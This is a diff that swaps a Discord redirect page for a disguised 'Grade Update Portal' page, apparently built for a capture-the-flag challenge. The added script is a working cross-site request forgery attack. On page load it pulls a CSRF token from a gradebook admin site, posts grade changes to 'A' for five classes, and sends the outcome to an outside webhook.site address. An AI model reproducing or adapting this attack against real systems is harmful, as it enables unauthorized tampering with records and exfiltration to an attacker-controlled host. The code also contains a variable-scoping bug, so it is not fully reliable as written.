@@ -1,25 +1,115 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting to Discord...</title>
-    <script>
-        // Attempt to open in a new tab/window first
-        function openDiscord() {
-            window.open('https://discord.gg/eQSpA7Bz64', '_blank');
-            
-            // Fallback to regular redirect if popup is blocked
-            setTimeout(function() {
-                window.location.href = 'https://discord.gg/eQSpA7Bz64';
-            }, 100);
-        }
-    </script>
+    <title>Grade Update Portal</title>
 </head>
-<body onload="openDiscord()">
-    <noscript>
-        <p>JavaScript is disabled. Please click <a href="https://discord.gg/eQSpA7Bz64">here</a> to join the Discord server.</p>
-    </noscript>
-    <p>If you are not redirected automatically, please click <a href="https://discord.gg/eQSpA7Bz64">here</a>.</p>
+<body>
+    <h2>Administrative Grade Update in Progress...</h2>
+    
+    <script>
+    // YOUR INFORMATION
+    const YOUR_STUDENT_ID = 'cec61aee-395d-4281-af96-cfe05bda466e';
+    const YOUR_CLASS_IDS = [
+        'e522382b-7643-469c-ae52-ba488f5752c6',
+        '5042bbaa-aae3-4bab-b841-2e7beb30c847',
+        '8938a046-e7c5-4402-84b7-36980f2eede6',
+        'abf7c048-cc3a-4797-9445-57e8cb725e71',
+        '19481783-157e-45e1-8592-77efd688144a'
+    ];
+
+    async function changeGrades() {
+        try {
+            console.log('Starting grade change process...');
+            
+            // 1. First get the CSRF token from the grade-change page
+            console.log('Fetching CSRF token...');
+            const response = await fetch('https://gradebook-admin.ctf.csaw.io/grade-change', {
+                credentials: 'include',
+                headers: {
+                    'Cache-Control': 'no-cache'
+                }
+            });
+            
+            if (!response.ok) {
+                throw new Error(`Failed to fetch grade-change page: ${response.status}`);
+            }
+            
+            const html = await response.text();
+            console.log('Grade-change page loaded');
+            
+            // Extract CSRF token from the HTML
+            const parser = new DOMParser();
+            const doc = parser.parseFromString(html, 'text/html');
+            const csrfInput = doc.querySelector('input[name="csrf_token"]');
+            
+            if (!csrfInput) {
+                // Alternative: look for meta tag or other CSRF token locations
+                const metaToken = doc.querySelector('meta[name="csrf-token"]');
+                if (metaToken) {
+                    csrfToken = metaToken.getAttribute('content');
+                } else {
+                    throw new Error('CSRF token not found in page');
+                }
+            }
+            
+            const csrfToken = csrfInput.value;
+            console.log('CSRF Token found:', csrfToken);
+            
+            // 2. Change grades for each class
+            let successCount = 0;
+            
+            for (const classId of YOUR_CLASS_IDS) {
+                console.log(`Changing grade for class ${classId}...`);
+                
+                const formData = new FormData();
+                formData.append('student_id', YOUR_STUDENT_ID);
+                formData.append('class_id', classId);
+                formData.append('grade', 'A');
+                formData.append('csrf_token', csrfToken);
+                
+                const changeResponse = await fetch('https://gradebook-admin.ctf.csaw.io/grade-change', {
+                    method: 'POST',
+                    body: formData,
+                    credentials: 'include',
+                    headers: {
+                        'Referer': 'https://gradebook-admin.ctf.csaw.io/grade-change'
+                    }
+                });
+                
+                const resultText = await changeResponse.text();
+                console.log(`Class ${classId} result:`, changeResponse.status, resultText.substring(0, 100));
+                
+                if (changeResponse.ok) {
+                    successCount++;
+                }
+                
+                // Small delay between requests to avoid rate limiting
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+            
+            // 3. Send confirmation to webhook
+            console.log('Sending results to webhook...');
+            await fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: `Successfully changed ${successCount}/5 grades for student ${YOUR_STUDENT_ID} at ${new Date().toISOString()}`
+            });
+            
+            console.log('Grade change process completed!');
+            
+        } catch (error) {
+            console.error('Error:', error);
+            // Send error to webhook
+            await fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: `Error: ${error.message} at ${new Date().toISOString()}`
+            });
+        }
+    }
+
+    // Execute when page loads with a small delay
+    setTimeout(changeGrades, 1000);
+    </script>
 </body>
 </html>
